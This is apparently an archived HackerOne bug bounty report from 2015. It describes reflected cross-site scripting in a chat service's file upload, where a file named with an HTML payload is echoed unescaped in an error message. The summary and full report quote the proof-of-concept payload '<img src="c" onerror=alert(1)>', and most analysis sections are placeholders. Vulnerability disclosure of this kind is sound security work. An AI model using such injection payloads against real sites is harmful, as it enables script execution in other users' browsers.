# Reflected XSS in chat.

## Metadata
- **Source:** HackerOne
- **Report:** 81757 | https://hackerone.com/reports/81757
- **Submitted:** 2015-08-11
- **Reporter:** dz_samir
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
hello 
login in the chat  and upload file with Payload name (code injection)
like  <img src="c" onerror=alert(1)>   the code html will execute 

<span>You are not allowed to upload '<img src="c" onload="alert(1)">' files, allowed types: jpg, jpeg, gif, png</span>



Hadji Samir

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

hello 
login in the chat  and upload file with Payload name (code injection)
like  <img src="c" onerror=alert(1)>   the code html will execute 

<span>You are not allowed to upload '<img src="c" onload="alert(1)">' files, allowed types: jpg, jpeg, gif, png</span>



Hadji Samir

</details>

---
*Analysed by Claude on 2026-05-24*
